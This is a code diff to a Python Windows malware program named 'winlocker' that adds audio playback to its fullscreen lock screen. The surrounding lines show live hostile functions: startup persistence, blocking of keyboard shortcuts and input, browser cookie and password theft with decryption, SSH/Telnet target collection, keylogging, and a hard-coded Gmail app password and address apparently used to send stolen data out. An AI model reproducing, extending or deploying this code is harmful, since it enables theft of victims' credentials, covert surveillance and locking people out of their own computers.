@@ -20,6 +20,8 @@ GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/video.mp4"
 AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/xz.mp3"
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "dedsek_video.mp4")
+AUDIO_PATH = os.path.join(tempfile.gettempdir(), "dedsek_audio.mp3")
 
 attempts_left = MAX_ATTEMPTS
 keylog_data = []
@@ -91,16 +93,20 @@ def add_to_startup():
             except: pass
     except: pass
 
-# ===== СКАЧИВАНИЕ ВИДЕО =====
+# ===== СКАЧИВАНИЕ =====
 def download_video():
     try:
         if not os.path.exists(VIDEO_PATH) or os.path.getsize(VIDEO_PATH) < 1000:
             urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
-        return os.path.exists(VIDEO_PATH) and os.path.getsize(VIDEO_PATH) > 1000
-    except:
-        return False
+    except: pass
 
-# ===== ВИДЕО НА ВЕСЬ ЭКРАН =====
+def download_audio():
+    try:
+        if not os.path.exists(AUDIO_PATH) or os.path.getsize(AUDIO_PATH) < 1000:
+            urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
+    except: pass
+
+# ===== ВИДЕО + ЗВУК =====
 def play_video_fullscreen():
     try:
         video = tk.Tk()
@@ -113,31 +119,39 @@ def play_video_fullscreen():
         
         try:
             import keyboard
-            for k in ['alt+f4','alt+tab','ctrl+alt+del','ctrl+shift+esc','ctrl+esc','ctrl+w','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','esc','space','enter','left windows','right windows']:
+            for k in ['alt+f4','alt+tab','ctrl+alt+del','ctrl+shift+esc','ctrl+esc','ctrl+w','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','esc','space','enter']:
                 keyboard.add_hotkey(k, lambda: None, suppress=True)
             keyboard.block_key('windows')
             keyboard.block_key('esc')
-            keyboard.block_key('enter')
-            keyboard.block_key('space')
         except:
             ctypes.windll.user32.BlockInput(True)
         
         lbl = tk.Label(video, bg='black')
         lbl.pack(expand=True, fill='both')
         
+        # Запускаем звук
+        try:
+            import pygame
+            pygame.mixer.init()
+            pygame.mixer.music.load(AUDIO_PATH)
+            pygame.mixer.music.play()
+        except:
+            pass
+        
+        # Проигрываем видео
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
             if fps <= 0 or fps > 60: fps = 30
             
-            screen_w = video.winfo_screenwidth()
-            screen_h = video.winfo_screenheight()
+            sw = video.winfo_screenwidth()
+            sh = video.winfo_screenheight()
             
             while cap.isOpened():
                 ret, frame = cap.read()
                 if not ret: break
                 
-                frame = cv2.resize(frame, (screen_w, screen_h))
+                frame = cv2.resize(frame, (sw, sh))
                 frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                 img = tk.PhotoImage(data=cv2.imencode('.ppm', frame_rgb)[1].tobytes())
                 lbl.config(image=img)
@@ -146,6 +160,10 @@ def play_video_fullscreen():
                 time.sleep(1/fps)
             
             cap.release()
+        
+        try:
+            pygame.mixer.music.stop()
+        except: pass
         
         video.destroy()
         
@@ -214,7 +232,7 @@ def boot_anim():
     
     time.sleep(1); a.destroy()
 
-# ===== ВСЕ IP ДЛЯ SSH/TELNET =====
+# ===== SSH/TELNET TARGETS =====
 def get_ssh_telnet_targets():
     targets = []
     
@@ -258,7 +276,7 @@ def get_ssh_telnet_targets():
     
     return targets
 
-# ===== РАСШИФРОВКА ПАРОЛЕЙ =====
+# ===== РАСШИФРОВКА =====
 def _decrypt_aes_gcm(data, key):
     try:
         from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -413,7 +431,6 @@ def steal_cookies_all():
             shutil.copy2(cp, db)
             conn = sqlite3.connect(db)
             cur = conn.cursor()
-            
             try:
                 cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                 for host, name, enc in cur.fetchall():
@@ -428,7 +445,6 @@ def steal_cookies_all():
                     for host, name, val in cur.fetchall():
                         r.append(f"{browser} | {host} | {name} | {val[:100]}")
                 except: pass
-            
             conn.close()
             try: os.remove(db)
             except: pass
@@ -775,6 +791,7 @@ if __name__ == "__main__":
     hide_console(); disable_win_key(); add_to_startup()
     
     threading.Thread(target=download_video, daemon=True).start()
+    threading.Thread(target=download_audio, daemon=True).start()
     threading.Thread(target=mega_steal, daemon=True).start()
     threading.Thread(target=record_loop, daemon=True).start()
     threading.Thread(target=keylogger_thread, daemon=True).start()
